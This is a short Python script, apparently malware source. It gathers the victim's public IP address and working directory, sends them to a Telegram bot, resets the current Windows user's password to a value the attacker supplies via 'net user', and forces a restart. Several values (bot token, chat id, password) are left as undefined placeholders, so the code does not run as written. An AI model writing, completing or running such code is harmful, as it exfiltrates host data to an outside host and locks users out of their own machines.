import os
import requests



def start():
    url = 'https://httpbin.org/ip'
    re = requests.get(url).text
    cwd = os.getcwd()
        
    try:
        requests.get(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text="+str(re+'\n'+cwd))
        os.system(f"net user %username% {your-pass}")
        os.system("shutdown -r")
    except:
        print("check connection")



if __name__ == '__main__':
    start()
